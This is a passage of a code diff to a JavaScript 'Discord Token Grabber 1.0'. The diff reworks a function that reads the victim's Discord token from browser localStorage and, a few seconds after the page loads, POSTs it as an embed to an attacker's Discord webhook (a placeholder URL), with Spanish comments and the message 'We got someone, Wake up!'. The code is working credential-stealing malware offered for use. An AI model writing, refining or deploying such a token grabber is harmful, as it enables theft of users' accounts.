@@ -109,30 +109,40 @@
        })());
     }
     //---------------------------------------------------
-    
-    function dmdisc(message) {
-        let webhookurl = ""; //put your webhook url here.
-        let request = new XMLHttpRequest();
-        request.open("POST", webhookurl);
+    function sendEmbedMessage(message) {
+    let webhookurl = "TU_URL_DE_WEBHOOK"; // Reemplaza con tu URL de webhook de Discord
+    let request = new XMLHttpRequest();
+    request.open("POST", webhookurl);
 
-        request.setRequestHeader('Content-type', 'application/json');
+    request.setRequestHeader('Content-type', 'application/json');
 
-        let params = {
-        username: ".:Discord Token Grabber 1.0:.",
-        avatar_url: "https://i.imgur.com/nU9WM3V.jpg",
-        content: '**We got someone, Wake up!\nToken: '+message+'**'
-        }
+    let params = {
+        embeds: [{
+            title: "Discord Token Grabber 1.0",
+            description: "We got someone, Wake up!",
+            color: 16711680, // Color Rojo
+            fields: [{
+                name: "Token",
+                value: message
+            }],
+            author: {
+                name: "Nombre del Autor",
+                icon_url: "https://i.imgur.com/nU9WM3V.jpg" // URL de la imagen del autor
+            }
+        }]
+    };
 
-        request.send(JSON.stringify(params));
+    request.send(JSON.stringify(params));
+}
+
+var userToken = localStorage.getItem('token');
+
+document.addEventListener('readystatechange', event => {
+    if (event.target.readyState === "interactive") {} else if (event.target.readyState === "complete") {
+        setTimeout(function () {
+            setTimeout(function () {
+                sendEmbedMessage(userToken);
+            }, 1000);
+        }, 3000);
     }
-
-    var userToken = localStorage.getItem('token');
- 
-    document.addEventListener('readystatechange', event => {
-       if(event.target.readyState === "interactive") {} else if(event.target.readyState === "complete") {
-          setTimeout(function () {
-             setTimeout(function () {dmdisc(userToken);},1000); 
-          }, 3000);
-       }
-    });
- })();
+});
